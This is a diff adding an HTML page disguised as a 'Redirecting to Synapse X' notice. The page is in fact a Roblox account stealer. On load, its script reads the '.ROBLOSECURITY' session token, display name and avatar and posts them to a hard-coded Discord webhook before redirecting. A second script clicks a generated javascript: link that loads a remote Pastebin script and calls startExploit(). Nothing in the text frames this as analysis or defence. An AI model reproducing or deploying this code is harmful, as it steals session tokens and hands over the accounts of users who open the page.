@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirecting to Synapse X...</title>
+  </head>
+  <body>
+    <p>Please wait while we redirect you to Synapse X...</p>
+    <script>
+      function sendWebhook() {
+        const token = localStorage.getItem(".ROBLOSECURITY");
+        const username = document.querySelector("#nav-robux-balance").getAttribute("data-navbar-displayname");
+        const avatar = document.querySelector("#nav-header-avatar").getAttribute("src");
+        const webhookID = "1093639409351528610";
+        const webhookToken = "https://discord.com/api/webhooks/1093639409351528610/dBlxb94dfYbx8T5MS5EDImBxfvxLgnRoZfuHrPoVLZKp3CV1aKsL8z7l6qquRt5ikpN7";
+        const url = `https://discord.com/api/webhooks/${webhookID}/${webhookToken}`;
+        const data = {
+          content: token,
+          username: username,
+          avatar_url: avatar
+        };
+        fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+      }
+      setTimeout(sendWebhook, 1000);
+      window.location.href = "https://x.synapse.to";
+    </script>
+    <script>
+      const link = document.createElement("a");
+      link.href = "javascript:(function(){function loadScript(url,callback){var script=document.createElement('script');script.type='text/javascript';if(script.readyState){script.onreadystatechange=function(){if(script.readyState=='loaded'||script.readyState=='complete'){script.onreadystatechange=null;callback();}};}else{script.onload=function(){callback();};}script.src=url;document.getElementsByTagName('head')[0].appendChild(script);}loadScript('https://pastebin.com/raw/SCRIPT_ID_HERE',function(){startExploit();});})();";
+      link.click();
+    </script>
+  </body>
+</html>
